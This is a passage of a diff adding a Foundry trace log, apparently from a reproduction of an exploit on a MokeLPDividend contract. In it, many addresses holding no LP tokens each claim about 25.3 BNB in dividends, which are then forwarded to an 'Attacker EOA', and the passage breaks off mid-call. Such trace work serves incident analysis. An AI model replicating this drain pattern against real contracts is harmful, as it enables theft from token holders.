+    │   │   ├─ emit DividendClaimed(param0: 0x353e1a32cFF866F96b804Df3ed25bec9F91e3229, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1a171bdf30f825b07fa8cd2aa2508189ca54171308e15331933cfc3326fb4abc: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x353e1a32cFF866F96b804Df3ed25bec9F91e3229)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872)
+    │   ├─ [0] VM::prank(0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xacb62dff4fa4e69514fd7ac7a098b54e0683d7838e9ba38eb1525538dd051a03: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xdaE4EfaCe3bCB36fb49BeB7400E5BBCE46383872)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0)
+    │   ├─ [0] VM::prank(0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x268970b6143bb5d696f62d34a76bab8f44940b76a7b525b2852287175c8c2015: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x2Abe285FdcB738975d794A8f57EAC8Ea8470BFf0)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9)
+    │   ├─ [0] VM::prank(0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xe1cabef1bae24c241d5375dbd6a14e62941e1729043485fff2e140960d635d24: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xfB6D00738dD1893e69eeeCd7FF76C91Ef51679a9)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4)
+    │   ├─ [0] VM::prank(0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x771cd462e21e9ff35314b45dd097dbd5a14554637c3eefd2d49c54cdd8e5a9fe: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x86e3034BdFe03D356f1462DBF522f6Bc154b7CB4)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B)
+    │   ├─ [0] VM::prank(0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x658bcd09affabe28a9adb0609323a2176764a403b43379ba279e7c6cb589ea34: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xDd9e0e4Eed263eD0C88bD8986CeC47948E53660B)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x2283BA1471694894cDC20f67cd7478bEf3295c59)
+    │   ├─ [0] VM::prank(0x2283BA1471694894cDC20f67cd7478bEf3295c59)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x2283BA1471694894cDC20f67cd7478bEf3295c59) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x2283BA1471694894cDC20f67cd7478bEf3295c59, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x2283BA1471694894cDC20f67cd7478bEf3295c59::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x2283BA1471694894cDC20f67cd7478bEf3295c59, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc9e51c6d9f98ac89b507481bc7923f42c85964c8958a6b36c23cecae61d13005: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x2283BA1471694894cDC20f67cd7478bEf3295c59)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA)
+    │   ├─ [0] VM::prank(0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x48beb4c42ac48e03ea6c09b4e37c01fec6d1d271ff7db81e72c43735970e0303: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x556DdF3DB0e231DDb877C746c35bfF878efb4AaA)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x959b319b3F33834a50bf58167A5df591F102dA87)
+    │   ├─ [0] VM::prank(0x959b319b3F33834a50bf58167A5df591F102dA87)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x959b319b3F33834a50bf58167A5df591F102dA87) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x959b319b3F33834a50bf58167A5df591F102dA87, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x959b319b3F33834a50bf58167A5df591F102dA87::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x959b319b3F33834a50bf58167A5df591F102dA87, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa21c82963f2228e57a1f460e9d5907a8fa61602791de29815d0e44717824567a: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x959b319b3F33834a50bf58167A5df591F102dA87)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22)
+    │   ├─ [0] VM::prank(0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xca8833f40d90b59ea394909df7df6e49a4ada0df083eb55fa9cb4a86daeb0448: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x315376d2c0BF3EDb2FC9955F7789d6158Aab1E22)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x3d4aF5D54b440aca4acBB10bA67efB903db28300)
+    │   ├─ [0] VM::prank(0x3d4aF5D54b440aca4acBB10bA67efB903db28300)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x3d4aF5D54b440aca4acBB10bA67efB903db28300) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x3d4aF5D54b440aca4acBB10bA67efB903db28300, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x3d4aF5D54b440aca4acBB10bA67efB903db28300::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x3d4aF5D54b440aca4acBB10bA67efB903db28300, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x87b4d48b26004b5d9f1c20dbee26c131457d4026f3419ddc4e561286a70aabc5: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x3d4aF5D54b440aca4acBB10bA67efB903db28300)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01)
+    │   ├─ [0] VM::prank(0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbaa6354ed141d8cc0aa8be297efceea86b113bb17c10835d6d6aabb0a6b2af65: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xeB7D60E939bD74400D10D45EF32d84D7b6ce8e01)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc)
+    │   ├─ [0] VM::prank(0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x88928ac8e2895c2e54cc2961a0c00cf34ada82115f2a0e4e0296eab74e43a2de: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x7C4838a74F4F88a59E86c49D2F458cAe69aAB9Dc)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x3a5B152D57cCf30191De3C3812968A39Bd88E651)
+    │   ├─ [0] VM::prank(0x3a5B152D57cCf30191De3C3812968A39Bd88E651)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x3a5B152D57cCf30191De3C3812968A39Bd88E651) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x3a5B152D57cCf30191De3C3812968A39Bd88E651, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x3a5B152D57cCf30191De3C3812968A39Bd88E651::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x3a5B152D57cCf30191De3C3812968A39Bd88E651, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x98ccfb9662f82f491325c3ce77eee460c8899c85e31f83a1d5a897b97d93d160: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x3a5B152D57cCf30191De3C3812968A39Bd88E651)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9)
+    │   ├─ [0] VM::prank(0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xe8ececfb5a4aa504bd4032eccb07366d4a29f8e4f5f50bcfb8e719248c2afdf7: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xdC8a09D04b2b45e8f571D9c9Ca64aB83d64212e9)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8)
+    │   ├─ [0] VM::prank(0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4315031d90140a4d728f0ae18053adf6bd1f45113a945045cb915ed19d01bf83: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xc2555B5DabDbe72eb45bc56B3aBF6a248F614BF8)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e)
+    │   ├─ [0] VM::prank(0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x01170503a47766550ecb936d0ee7944c1301951ad539cebbdae8beb453da00c7: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x52f35505E181a4dD8174424FDfE7ccA7bD35ee9e)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d)
+    │   ├─ [0] VM::prank(0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x50e9cddaf86382fa117fcd62e31ede03376c2daea3b726cda50d6cd921f76171: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xA6491094bCE4D2787E54d1d33Fa1BE31Ec88cC7d)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x871c5adC363553D8DDF88963CE37c0128D34CCe2)
+    │   ├─ [0] VM::prank(0x871c5adC363553D8DDF88963CE37c0128D34CCe2)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x871c5adC363553D8DDF88963CE37c0128D34CCe2) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x871c5adC363553D8DDF88963CE37c0128D34CCe2, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x871c5adC363553D8DDF88963CE37c0128D34CCe2::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x871c5adC363553D8DDF88963CE37c0128D34CCe2, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x79d7f77b86a3bccbda73b67b7a9bd9c618e7675268e4301e75219703e1a76747: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x871c5adC363553D8DDF88963CE37c0128D34CCe2)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893)
+    │   ├─ [0] VM::prank(0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xbd27d0a71473f465468e7754eb4a811eccbb45b0bae188268a7f2ee68e9b10b7: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x25e5013d0D071aE3a7eBcADBbD5C39f7F31Ec893)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x2210384762c6313BdF2109CBB4538169C8b10da4)
+    │   ├─ [0] VM::prank(0x2210384762c6313BdF2109CBB4538169C8b10da4)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x2210384762c6313BdF2109CBB4538169C8b10da4) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x2210384762c6313BdF2109CBB4538169C8b10da4, param1: 985789028950366818528 [9.857e20], param2: 0)
+    │   │   ├─ [0] 0x2210384762c6313BdF2109CBB4538169C8b10da4::fallback{value: 18709414160923943980}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x2210384762c6313BdF2109CBB4538169C8b10da4, param1: 18709414160923943980 [1.87e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x83e0d30dfd426c0d7a3793239a547f8acfdde3c8cb93ed367b858a57b14bd8ed: 0x00000000000000000000000000000000000000000000003570922ae56fe110e0 → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x2210384762c6313BdF2109CBB4538169C8b10da4)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 18709418635773943980}()
+    │   └─ ← [Stop]
+    ├─ [62444] ContractTest::claimAs(Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a])
+    │   ├─ [0] VM::prank(Attacker EOA: [0xE454a9BAC1a44868e4A9Cbe1a4B5ac231D0DCF8a])
+    │   │   └─ ← [Return]
+    │   ├─ [61082] MokeLPDividend::claimDividend()
